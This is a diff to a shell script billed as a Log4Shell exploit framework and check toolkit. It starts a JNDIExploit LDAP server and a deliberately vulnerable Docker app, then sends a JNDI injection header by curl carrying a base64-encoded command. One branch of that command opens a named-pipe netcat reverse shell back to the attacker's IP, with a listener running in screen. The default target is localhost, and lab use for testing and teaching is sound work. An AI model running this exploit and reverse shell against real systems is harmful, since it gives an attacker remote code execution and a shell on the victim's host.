@@ -23,7 +23,7 @@
 # > Running Log4shell Framework & Check-Toolkit on shell v0.1a (C) 2021 suuhm
 
 
-MY_IP=$(ip addr | grep "inet .*scope global" | sed -r 's/.*\ ([0-9].*)\/.*/\1/g')
+MY_IP=$(ip addr | grep "inet .*scope global" | sed -r 's/.*\ ([0-9].*)\/.*/\1/g' | head -n1)
 XPL_IP=$MY_IP
 
 _url_encoder() {
@@ -49,7 +49,8 @@ _run_xploit_server() {
 	
 	sleep 2
 	echo -e "\nRunning LDAP server on $XPL_IP:8888 -> LDAP:1389\n"
-	java -jar JNDIExploit-1.2-SNAPSHOT.jar -i $XPL_IP -p 8888
+	# Screen -> Session create Window Ctrl+a C ; Split: Ctrl+a S or | ; Kill k ; Help ?
+	screen -dm -S l4s4s-ldap-srv bash -c 'java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 127.0.0.1 -p 8888'
 }
 
 _set_windows() {
@@ -116,7 +117,7 @@ _run_dummy_server() {
 	echo "watch content with : docker exec vulnerable-app ls /tmp"
 	echo
 	sleep 2
-	docker run --name vulnerable-app -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
+	screen -dm -S l4s4s-tomcat-srv bash -c 'docker run --name vulnerable-app -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app'
 
 	# BUILD SELF
 	# docker build . -t vulnerable-app
@@ -124,12 +125,15 @@ _run_dummy_server() {
 
 	# ssh $XPL_IP -p 22 "wget $ARCH_URL && unzip JNDIExploit.v1.2.zip && java -jar JNDIExploit-1.2-SNAPSHOT.jar -i $XPL_IP -p 8888"
 	_run_xploit_server
+	
+	echo -e "\nOK. Now you can select your Screen to check:\n"
+	screen -ls
 }
 
 _run_attack() {
 
-	_run_xploit_server
-	sleep 2
+	_run_xploit_server && sleep 2
+	RSH=0
 	
 	if [[ "$2" =~ ^-[a-z] ]]; then
 		VIC_IP_PRT=127.0.0.1:8080
@@ -145,8 +149,10 @@ _run_attack() {
 		# nc -e issnt working in maintain versions :()
 
 		#Listen & run on other term/host
-		nohup nc -nvlp 4244 &
-
+		#nohup nc -nvlp 4244 &
+		screen -dm -S l4s4s-nc-rsh bash -c 'nc -nvlp 4244'
+		RSH=1
+		
 		# Reverse Prixy Shell - NC version
 		# rm -f /tmp/bp;mknod /tmp/bp p && cat /tmp/bp | /bin/sh -i 2>&1 | nc $MY_IP 4244 >/tmp/bp
 		C="rm -f /tmp/bp;mknod /tmp/bp p && /bin/sh 0</tmp/bp | nc $MY_IP 4244 1>/tmp/bp"
@@ -161,12 +167,17 @@ _run_attack() {
 	B64C=$(echo $C | base64 -w0)
 	B64S=$(_url_encoder $B64C)
 
-	echo -e "\nConnection to $VIC_IP_PRT"
-	curl $VIC_IP_PRT -H 'X-Api-Version: ${jndi:ldap://$XPL_IP:1389/Basic/Command/Base64/$B64S}'
+	echo -e "\nConnection to $VIC_IP_PRT - Using XPL IP: $XPL_IP"
+	curl -sSL $VIC_IP_PRT -H 'X-Api-Version: ${jndi:ldap://'$XPL_IP':1389/Basic/Command/Base64/'$B64S'}'
 	
-	if [ -z $RSH ]; then
+	echo -e "\nOK. Now you can select your Screen to check:\n"
+	screen -ls
+	
+	echo -ne "\nPress enter to continue: "; read e
+	
+	if [ $RSH -gt 0 ]; then
 		echo "Foreground Reverse Shell..."
-		sleep 3 && fg 1
+		sleep 3 && screen -r l4s4s-nc-rsh
 	fi
 }
 
